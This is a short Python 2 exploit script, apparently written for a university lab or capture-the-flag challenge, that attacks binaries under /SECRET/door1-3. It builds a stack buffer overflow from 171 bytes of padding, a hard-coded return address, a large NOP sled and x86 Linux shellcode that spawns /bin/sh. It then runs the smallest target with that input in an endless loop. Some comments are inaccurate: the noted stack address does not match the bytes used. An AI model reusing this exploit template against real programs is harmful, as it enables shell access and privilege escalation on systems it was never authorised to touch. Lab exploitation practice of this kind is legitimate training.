#!/usr/bin/env python2

import os, sys

#author: Ahmed Gazzaz
#CyberSecurity
#SLIIT
#Educational Purpose

#Set the file location
files = ['/SECRET/door1/file','/SECRET/door2/file','/SECRET/door3/file']

#gdb-peda$ shellcode generate x86/linux exec
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

#identified earlier during initial enumerations, if the previous gdb is still open it can be confirmed with 'pattern_search eip'
boverflow = 'A'*171

#x/s $esp
# 0xbf a4 ee 20 (need to reverse this)
eip = '\x2b\x1a\xcc\xbf'

#this has so many purposes in realtime, but here it is meant to slide the shellcode if the EIP is hit correctly. 
nopsled = '\x90'*20480

#the exploit ofcourse, which will overwrite the eip register, overflow the buffer and the put the payload in to the eip register.
exploit =  boverflow + eip + nopsled + shellcode 

while True: #basically just to run forever
	fileSize = []
	for f in files: #just like any for loop, will pick the file, finish execution, get the other one and iterate again.
		fileSize.append(os.path.getsize(f)) #here it will get the os path and get the size of the file
	sizeIndex = fileSize.index(min(fileSize)) #find the smallest file
	os.system(files[sizeIndex] + " " + exploit) #run the command, with the smallest file

